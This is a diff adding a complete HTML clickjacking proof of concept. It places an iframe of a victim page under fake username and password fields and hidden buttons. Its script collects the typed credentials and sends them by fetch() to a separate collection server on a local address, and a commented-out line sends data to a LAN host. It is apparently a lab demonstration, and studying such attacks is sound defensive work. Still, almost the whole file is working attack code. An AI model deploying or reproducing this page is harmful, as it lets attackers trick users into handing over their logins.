@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking Example</title>
+  <style>
+    iframe {
+      width: 1500px;
+      height: 1500px;
+      position: absolute;
+      top: 0;
+      left: 0;
+      opacity: 1;
+      z-index: -1; /* Updated z-index to send iframe to the background */
+    }
+
+    #myButton {
+      position: absolute;
+      top: 562px;
+      left: 620px;
+      opacity: 0; /* Hide the button */
+    }
+    #myButton1 {
+      position: absolute;
+      top: 498px;
+      left: 790px;
+      opacity: 0.9; /* Hide the button */
+    }
+    #input1 {
+      position: absolute;
+      top: 374px;
+      left: 633px;
+      opacity: 1;
+      width: 200px;
+      height: 23px;
+    }
+    #input2 {
+      position: absolute;
+      top: 438px;
+      left: 633px;
+      opacity: 1;
+      width: 200px;
+      height: 23px;
+    }
+    input {
+            border: none;
+            outline: none;
+        }
+    input::placeholder {
+      font-size: 18px;
+    }
+    .button-size {
+      width: 250px;
+      height: 23px;
+    }
+    .button-size1 {
+      width: 100px;
+      height: 30px;
+    }
+  </style>
+  <script>
+    function showAlert() {
+      alert("broken owns ur javascripts!");
+      var i=new Image;
+      var b = 'hello';
+      var inputValue1 = document.getElementById("input1").value;
+      var inputValue2 = document.getElementById("input2").value;
+      //i.src="http://192.168.117.240:8888/?"+'hello'
+      var url = "http://127.0.0.1:5001/process_data?" + "param1=" + encodeURIComponent(inputValue1) + "&param2=" + encodeURIComponent(inputValue2);
+
+      fetch(url)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+
+                .then(data => {
+                    console.log('Data received:', data);
+                    // You can handle the response data here
+                })
+                .catch(error => {
+                    console.error('There was a problem with the fetch operation:', error);
+                });
+
+
+    }
+	if(top.location!=self.locaton) {
+    parent.location = self.location;
+}
+
+  </script>
+</head>
+<body>
+  <div></div>
+
+  <!-- The URL from the victim site -->
+  <iframe src="http://127.0.0.1:9000/vulnerable.html " width="1000" height="1000" security="restricted"></iframe>
+
+  <button id="myButton" class="button-size" onclick="showAlert()">Click here!</button>
+  <button id="myButton1" class="button-size1" onclick="showAlert()">otpbutton</button>
+  <input type="text" id="input1" name="fname" placeholder="UserName">
+  <input type="text" id="input2" placeholder="Password">
+  <div></div>
+</body>
+</html>
